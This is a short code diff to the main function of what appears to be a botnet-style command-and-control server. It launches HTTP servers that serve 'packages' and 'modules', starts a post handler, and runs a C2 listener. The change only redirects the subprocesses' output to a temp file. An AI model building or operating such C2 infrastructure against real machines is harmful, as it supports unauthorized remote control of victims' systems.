@@ -138,11 +138,11 @@ def main():
             util.log("Unable to create directory 'data' (permission denied)")
 
     options = parser.parse_args()
-
+    tmp_file=open("temp","w")
     globals()['debug'] = options.debug
-    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=globals()['packages'], shell=True)
-    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, cwd=modules, shell=True)
-    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True)
+    globals()['package_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 2), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=globals()['packages'], shell=True)
+    globals()['module_handler'] = subprocess.Popen('{} -m SimpleHTTPServer {}'.format(sys.executable, options.port + 1), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, cwd=modules, shell=True)
+    globals()['post_handler'] = subprocess.Popen('{} core/handler.py {}'.format(sys.executable, options.port + 3), 0, None, subprocess.PIPE, stdout=tmp_file, stderr=tmp_file, shell=True)
     globals()['c2'] = C2(host=options.host, port=options.port, db=options.database)
     globals()['c2'].run()
 
